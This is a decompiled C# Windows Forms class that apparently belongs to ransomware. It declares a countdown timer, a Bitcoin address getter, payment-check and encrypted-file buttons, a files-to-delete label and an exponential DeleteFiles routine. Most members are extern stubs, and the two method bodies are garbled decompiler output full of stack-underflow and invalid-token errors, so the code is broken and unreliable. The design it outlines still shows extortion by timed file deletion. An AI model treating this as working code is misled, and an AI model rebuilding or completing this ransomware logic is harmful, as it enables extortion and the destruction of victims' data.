using System;
using System.ComponentModel;
using System.Windows.Forms;

namespace Main;

public class FormGame : Form
{
	private static int _timeLeftSec;

	private static int _exponent;

	private const double Base = 1.1;

	private static int _indexNum;

	private IContainer components;

	private Label labelWelcome;

	private Timer timerTypingEffect;

	private Label labelTask;

	private TextBox textBoxAddress;

	private Button buttonCheckPayment;

	private Button buttonViewEncryptedFiles;

	private Timer timerCountDown;

	private Label labelCountDown;

	private Label labelFilesToDelete;

	protected override extern CreateParams CreateParams { get; }

	public extern FormGame();

	private extern void FormGame_Load(object sender, EventArgs e);

	private static bool DidRun()
	{
		//Discarded unreachable code: IL_0007, IL_000f, IL_0021, IL_0027, IL_002d
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected I8, but got Unknown
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			_ = (nint)unchecked((uint)checked((int)/*Error near IL_0001: Stack underflow*/));
			/*Error near IL_0002: Invalid metadata token*/;
		}
	}

	private unsafe static void DeleteFiles(int num)
	{
		//Discarded unreachable code: IL_001a, IL_0020, IL_0027
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Expected I8, but got Unknown
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Invalid comparison between Unknown and I4
		_003F val2;
		do
		{
			int num2 = *(int*)(nint)/*Error: ldloc 0 (out-of-bounds)*/;
			_003F val = /*Error near IL_0003: Stack underflow*/>> num2;
			*(long*)(nint)/*Error near IL_0004: Stack underflow*/ = (long)val;
			((int[])/*Error near IL_0006: Stack underflow*/)[/*Error near IL_0006: Stack underflow*/] = 7;
			val2 = checked((int)/*Error near IL_0008: Stack underflow*/ + /*Error near IL_0008: ldloc 0 (out-of-bounds)*/);
		}
		while ((int)/*Error near IL_0013: Stack underflow*/ < (int)(uint)val2);
		_ = (ulong)((long[])/*Error near IL_0014: Stack underflow*/)[/*Error near IL_0014: Stack underflow*/];
		/*Error near IL_0015: Invalid metadata token*/;
	}

	private static extern string GetBitcoinAddess();

	private extern void FormGame_FormClosing(object sender, FormClosingEventArgs e);

	private void timerTypingEffect_Tick(object sender, EventArgs e)
	{
	}

	private extern void buttonCheckPayment_Click(object sender, EventArgs e);

	private extern void buttonViewEncryptedFiles_Click(object sender, EventArgs e);

	private extern void timerCountDown_Tick(object sender, EventArgs e);

	protected override extern void Dispose(bool disposing);

	private extern void InitializeComponent();
}
